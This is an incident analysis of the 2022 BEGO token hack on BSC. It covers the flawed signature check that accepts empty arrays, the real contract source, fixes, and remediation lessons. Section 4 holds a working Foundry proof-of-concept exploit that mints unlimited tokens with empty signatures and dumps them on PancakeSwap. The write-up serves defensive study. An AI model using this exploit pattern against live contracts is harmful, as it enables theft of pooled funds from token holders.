# BEGO — Signature Verification Bypass Unlimited Minting Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | BEGO Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~12 WBNB |
| **Attack Tx** | [0x9f4ef3cc55b016ea6b867807a09f80d1b2e36f6cd6fccfaf0182f46060332c57](https://bscscan.com/tx/0x9f4ef3cc55b016ea6b867807a09f80d1b2e36f6cd6fccfaf0182f46060332c57) |
| **BEGO Token** | [0xc342774492b54ce5F8ac662113ED702Fc1b34972](https://bscscan.com/address/0xc342774492b54ce5F8ac662113ED702Fc1b34972) |
| **Attack Contract** | [0x08a525104Ea2A92aBbcE8e4e61C667eED56f3B42](https://bscscan.com/address/0x08a525104Ea2A92aBbcE8e4e61C667eED56f3B42) |
| **Attacker** | [0xde01f6Ce91E4F4bdB94BB934d30647d72182320F](https://bscscan.com/address/0xde01f6Ce91E4F4bdB94BB934d30647d72182320F) |
| **WBNB/BEGO Pair** | [0x88503F48e437a377f1aC2892cBB3a5b09949faDd](https://bscscan.com/address/0x88503F48e437a377f1aC2892cBB3a5b09949faDd) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | The `mint()` function accepts an empty signature array, allowing arbitrary minting without signature verification |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/BEGO_exp.sol) |

---
## 1. Vulnerability Overview

BEGO is a BSC token implementing a custom ERC20 (`BEGO20`) that uses off-chain signatures to authorize minting via the `mint()` function. However, when the signature arrays (`bytes32[] r, bytes32[] s, uint8[] v`) are empty, the loop terminates immediately, causing signature verification to be entirely skipped. The attacker minted 1 trillion BEGO tokens with empty signatures, then sold the entire amount for WBNB on PancakeSwap, draining approximately 12 WBNB.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable mint() - accepts empty signature arrays
contract BEGO20 {
    function mint(
        uint256 amount,
        string memory nonce,
        address to,
        bytes32[] memory r,
        bytes32[] memory s,
        uint8[]  memory v
    ) external {
        // ❌ If r, s, v are empty arrays, the loop never executes
        // Signature verification is completely bypassed
        for (uint256 i = 0; i < r.length; i++) {
            address signer = ecrecover(
                keccak256(abi.encodePacked(amount, nonce, to)),
                v[i], r[i], s[i]
            );
            // Signer validation logic...
        }
        // ❌ Unconditional mint after passing the loop
        _mint(to, amount);
    }
}

// ✅ Correct pattern - enforce minimum signature count
contract SafeBEGO20 {
    uint256 public constant MIN_SIGNATURES = 3; // Require multiple signers

    function mint(
        uint256 amount,
        string memory nonce,
        address to,
        bytes32[] memory r,
        bytes32[] memory s,
        uint8[]  memory v
    ) external {
        // ✅ Validate minimum signature count
        require(r.length >= MIN_SIGNATURES, "Insufficient signatures");
        require(r.length == s.length && s.length == v.length, "Array length mismatch");

        bytes32 msgHash = keccak256(abi.encodePacked(amount, nonce, to));
        for (uint256 i = 0; i < r.length; i++) {
            address signer = ecrecover(msgHash, v[i], r[i], s[i]);
            require(authorizedSigners[signer], "Unauthorized signer");
        }

        require(!usedNonces[nonce], "Nonce already used");
        usedNonces[nonce] = true;
        _mint(to, amount);
    }
}
```


### On-Chain Source Code

Source: **Sourcify-verified (partial)** — BGeoToken / 0xc342774492b54ce5F8ac662113ED702Fc1b34972 (BSC)
https://sourcify.dev/server/files/any/56/0xc342774492b54ce5F8ac662113ED702Fc1b34972

> Note: The contract is `BGeoToken` (named "Binance GeoDB Coin" / "BGEO"), not a generic `BEGO20`. The signature verification lives in the `isSigned` **modifier**, not directly in `mint()`. Two helper functions — `checkSignParams` and `isSigners` — both vacuously succeed on empty arrays, allowing the modifier to pass with zero signatures.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0 <0.8.0;

contract BGeoToken is BEP20, Signers {
    using SafeMath for uint256;

    uint8 constant bsc = 0;
    mapping(string => bool) public txHashes;

    // ❌ VULNERABLE MODIFIER: passes for empty r/s/v arrays
    modifier isSigned(
        string memory _txHash,
        uint256 _amount,
        bytes32[] memory _r,
        bytes32[] memory _s,
        uint8[] memory _v
    ) {
        require(checkSignParams(_r, _s, _v), "bad-sign-params"); // ❌ passes: [] == [] == []
        bytes32 _hash = keccak256(abi.encodePacked(bsc, msg.sender, _txHash, _amount));
        address[] memory _signers = new address[](_r.length); // ❌ length == 0 → empty array
        for (uint8 i = 0; i < _r.length; i++) {               // ❌ loop never executes
            _signers[i] = ecrecover(_hash, _v[i], _r[i], _s[i]);
        }
        require(isSigners(_signers), "bad-signers"); // ❌ passes: isSigners([]) returns true
        _;
    }

    // ❌ Returns true for empty arrays — length checks pass, contents never verified
    function checkSignParams(
        bytes32[] memory _r,
        bytes32[] memory _s,
        uint8[] memory _v
    ) private view returns (bool) {
        return (_r.length == _s.length) && (_s.length == _v.length);
        // ❌ 0 == 0 && 0 == 0 → true with empty arrays
    }

    // ❌ Returns true for an empty signers array — for-loop never runs
    function isSigners(address[] memory _signers) public view returns (bool) {
        for (uint8 i = 0; i < _signers.length; i++) { // ❌ _signers.length == 0 → skipped
            if (!_containsSigner(_signers[i])) {
                return false;
            }
        }
        return true; // ❌ unconditionally returns true when _signers is empty
    }

    // mint() itself looks fine — the flaw is entirely in the isSigned modifier above
    function mint(
        uint256 _amount,
        string memory _txHash,
        address _receiver,
        bytes32[] memory _r,
        bytes32[] memory _s,
        uint8[] memory _v
    ) isSigned(_txHash, _amount, _r, _s, _v) external returns (bool) {
        require(!txHashes[_txHash], "tx-hash-used");
        txHashes[_txHash] = true;
        _mint(_receiver, _amount); // ❌ reached freely with r=[], s=[], v=[]
        return true;
    }
}
```

**Why it is exploitable (identify the bug from the code):**

- `checkSignParams([], [], [])` evaluates `0 == 0 && 0 == 0` → `true`. The length-equality check that was meant to ensure well-formed inputs passes trivially for empty arrays.
- The `for` loop in `isSigned` runs `0` iterations (empty `_r`), so `_signers` remains a zero-length array of recovered addresses.
- `isSigners([])` iterates 0 times and falls through to `return true` — meaning "all zero signers are authorized" vacuously.
- `mint()` proceeds past the modifier, marks the nonce used, and calls `_mint()` to create arbitrary tokens.
- The per-nonce deduplication (`txHashes[_txHash]`) is the only remaining guard, and it is trivially bypassed by using a fresh nonce string on each call.

```solidity
// ✅ Fix: require at least one (or N-of-M) valid signatures before entering the loop
modifier isSigned(
    string memory _txHash,
    uint256 _amount,
    bytes32[] memory _r,
    bytes32[] memory _s,
    uint8[] memory _v
) {
    require(_r.length > 0, "no signatures provided");           // ✅ reject empty arrays
    require(checkSignParams(_r, _s, _v), "bad-sign-params");
    require(_r.length >= _signersLength(), "insufficient signatures"); // ✅ require all signers
    bytes32 _hash = keccak256(abi.encodePacked(bsc, msg.sender, _txHash, _amount));
    address[] memory _signers = new address[](_r.length);
    for (uint8 i = 0; i < _r.length; i++) {
        _signers[i] = ecrecover(_hash, _v[i], _r[i], _s[i]);
    }
    require(isSigners(_signers), "bad-signers");
    _;
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Call BEGO.mint(1_000_000_000_000e18, nonce, attacker, [], [], [])
    │       └─ r, s, v = empty arrays
    │           ├─ for (i = 0; i < 0; i++) → loop never executes
    │           └─ ❌ 1 trillion BEGO minted successfully without signature verification
    │
    ├─[2] Approve entire BEGO balance to PancakeRouter
    │
    ├─[3] swapExactTokensForTokensSupportingFeeOnTransferTokens()
    │       Sell all 1 trillion BEGO → WBNB
    │       → Liquidity pool WBNB drained
    │
    └─[4] Net profit: ~12 WBNB
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBEGO20 {
    function mint(
        uint256 amount,
        string calldata nonce,
        address to,
        bytes32[] calldata r,
        bytes32[] calldata s,
        uint8[]   calldata v
    ) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

contract BEGOExploit is Test {
    IBEGO20 bego   = IBEGO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);
    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address WBNB   = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        vm.createSelectFork("bsc", 22_315_679);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB balance", address(this).balance, 18);

        // [Step 1] Mint 1 trillion BEGO with empty signatures
        // ⚡ r, s, v = [] → for loop never executes → signature verification bypassed
        bytes32[] memory emptyBytes32 = new bytes32[](0);
        uint8[]   memory emptyUint8  = new uint8[](0);

        bego.mint(
            1_000_000_000_000 * 1e18,
            "exploit_nonce",
            address(this),
            emptyBytes32, // ❌ empty r array
            emptyBytes32, // ❌ empty s array
            emptyUint8    // ❌ empty v array
        );

        emit log_named_decimal_uint("[After mint] BEGO balance", bego.balanceOf(address(this)), 18);

        // [Step 2] Sell entire BEGO balance for WBNB
        bego.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(bego);
        path[1] = WBNB;

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bego.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        emit log_named_decimal_uint("[End] WBNB balance", address(this).balance, 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Signature Bypass via Empty Array |
| **CWE** | CWE-347: Improper Verification of Cryptographic Signature |
| **OWASP DeFi** | Off-chain Signature Verification Flaw |
| **Attack Vector** | `mint(amount, nonce, to, [], [], [])` — empty signature arrays |
| **Preconditions** | `mint()` function accepts empty signature arrays |
| **Impact** | ~12 WBNB loss, complete destruction of token value |

---
## 6. Remediation Recommendations

1. **Enforce minimum signature count**: Add `require(r.length >= MIN_SIGNATURES, ...)` before the loop.
2. **Validate array length consistency**: Verify `r.length == s.length && s.length == v.length`.
3. **Prevent nonce reuse**: Track `usedNonces[nonce]` to prevent double-minting with the same nonce.
4. **Use OpenZeppelin SignatureChecker**: Leverage a battle-tested signature verification library.

---
## 7. Lessons Learned

- **Loop boundary conditions**: Cases where empty array input causes the loop to never execute must be explicitly blocked. Validate length > 0 for all array parameters before entering the loop.
- **Weakness of multi-signature structures**: When implementing multi-signature verification via a loop, all edge cases must be tested — including empty arrays, duplicate signers, and signature ordering.
- **Criticality of minting permissions**: A vulnerability that allows unlimited minting can neutralize the entire value of a token in a single transaction.